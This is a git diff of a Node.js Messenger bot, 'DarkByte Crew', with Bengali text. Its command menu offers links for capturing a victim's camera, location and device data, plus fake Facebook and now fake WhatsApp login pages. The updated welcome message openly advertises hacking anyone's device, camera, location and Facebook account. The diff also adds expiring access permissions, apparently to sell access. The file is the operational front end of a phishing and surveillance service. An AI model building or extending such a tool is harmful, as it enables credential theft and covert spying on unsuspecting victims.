@@ -23,10 +23,11 @@ async function runCommand(senderId, command, args) {
         // ভুল কমান্ড (অজানা কমান্ড)
         await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:
 
-🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক দিবে ।
-🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক দিবে ।
-🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক দিবে ।
-🔹 .uid ➔ আপনার ফেসবুক আইডি দেখাবে ।
+🔹 .camera - ক্যামেরা + ডিভাইস ইনফো লিংক
+🔹 .location - লোকেশন + ডিভাইস ইনফো লিংক
+🔹 .fb - ফেক ফেসবুক লগইন লিংক
+🔹 .wp - ফেক হোয়াটসঅ্যাপ লগইন লিংক
+🔹 .uid - আপনার ফেসবুক আইডি দেখায়
 
 🔗 Owner: m.me/2ndJohnnySins`);
     }
@@ -68,27 +69,25 @@ router.post('/webhook', async (req, res) => {
 
                 user = new User({
                     fbId: senderId,
-                    firstName: fullName,   // পুরো নাম সংরক্ষণ
+                    firstName: fullName,
                     allowed: false,
+                    permissionExpiresAt: null,
                     firstSeen: new Date()
                 });
                 await user.save();
 
-                // নতুন ইউজারের জন্য ওয়েলকাম মেসেজ (আপনার দেওয়া ফরম্যাট)
+                // নতুন ইউজারের জন্য ওয়েলকাম মেসেজ
                 const introMsg = `আসসালামু আলাইকুম, ${fullName}! 👋
 
-DarkByte Crew বটে আপনাকে স্বাগতম! 🥳
+⚡ DarkByte Crew বটে আপনাকে স্বাগতম। 🥳
+আপনি এই বটের মাধ্যমে খুব সহজেই যে কারো ডিভাইসের ইনফোরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক আইডি হ্যাক করতে পারবেন।💯
 
-এই বটের মাধ্যমে আপনি খুব সহজেই ডিভাইসের ইনফরমেশন, ক্যামেরা, লোকেশন এবং ফেসবুক অ্যাকাউন্ট অ্যাক্সেস করার লিংক তৈরি করতে পারবেন। 💯
+আমাদের কমান্ড গুলোঃ
+📷 .camera - ক্যামেরা হ্যাকের লিঙ্ক তৈরি করুন
+🗾 .location - লোকেশন হ্যাকের লিঙ্ক তৈরি করুন
+🔥 .fb - ফেসবুক আইডি হ্যাকের লিঙ্ক তৈরি করুন
 
-⚙️ আমাদের কমান্ডসমূহ:
-━━━━━━━━━━━━━━━━━━━━
-📷 .camera — ক্যামেরা লিংক তৈরি করুন ।
-📍 .location — লোকেশন লিংক তৈরি করুন ।
-👤 .fb — ফেসবুক আইডি লিংক তৈরি করুন ।
-🆔 .uid ➔ আপনার ফেসবুক আইডি দেখুন ।
-
-🔗 Owner: m.me/2ndJohnnySins`;
+Owner : m.me/2ndJohnnySins`;
 
                 await sendMessage(senderId, introMsg);
                 continue;
@@ -99,9 +98,20 @@ DarkByte Crew বটে আপনাকে স্বাগতম! 🥳
             user.messageCount = (user.messageCount || 0) + 1;
             await user.save();
 
-            // অনুমতি চেক
-            if (!user.allowed) {
-                // অনুমতি না থাকলে মেসেজ
+            // ============================================================
+            // 🔥 পারমিশন চেক (এক্সপাইরি সহ)
+            // ============================================================
+            const isAllowed = user.allowed && (!user.permissionExpiresAt || new Date() < user.permissionExpiresAt);
+            
+            // যদি এক্সপায়ার হয়ে যায়, অটো বাতিল
+            if (user.allowed && user.permissionExpiresAt && new Date() > user.permissionExpiresAt) {
+                user.allowed = false;
+                await user.save();
+                console.log(`⛔ ইউজারের পারমিশন এক্সপায়ার: ${senderId}`);
+            }
+
+            if (!isAllowed) {
+                // পারমিশন নেই বা এক্সপায়ার
                 const accessDeniedMsg = `⛔ Access Denied / অনুমতি নেই!
 
 এই বটটি ব্যবহার করতে চাইলে ওনারের সাথে যোগাযোগ করে অনুমতি নিন।
@@ -118,12 +128,14 @@ DarkByte Crew বটে আপনাকে স্বাগতম! 🥳
                 const args = parts.slice(1);
                 await runCommand(senderId, command, args);
             } else {
-                // অনুমতি থাকলেও কমান্ড না দিলে নির্দেশনা (ভুল কমান্ডের মতো)
-                await sendMessage(senderId, `⚠️ আপনি ভুল কমান্ড দিয়েছেন! সঠিক কমান্ড দিন:
+                // অনুমতি থাকলেও কমান্ড না দিলে নির্দেশনা
+                await sendMessage(senderId, `📌 সঠিক কমান্ড দিন:
 
-🔹 .camera ➔ ক্যামেরা + ডিভাইস ইনফো লিংক
-🔹 .location ➔ লোকেশন + ডিভাইস ইনফো লিংক
-🔹 .fb ➔ ফেক ফেসবুক লগইন লিংক
+🔹 .camera - ক্যামেরা + ডিভাইস ইনফো লিংক
+🔹 .location - লোকেশন + ডিভাইস ইনফো লিংক
+🔹 .fb - ফেক ফেসবুক লগইন লিংক
+🔹 .wp - ফেক হোয়াটসঅ্যাপ লগইন লিংক
+🔹 .uid - আপনার ফেসবুক আইডি দেখায়
 
 🔗 Owner: m.me/2ndJohnnySins`);
             }
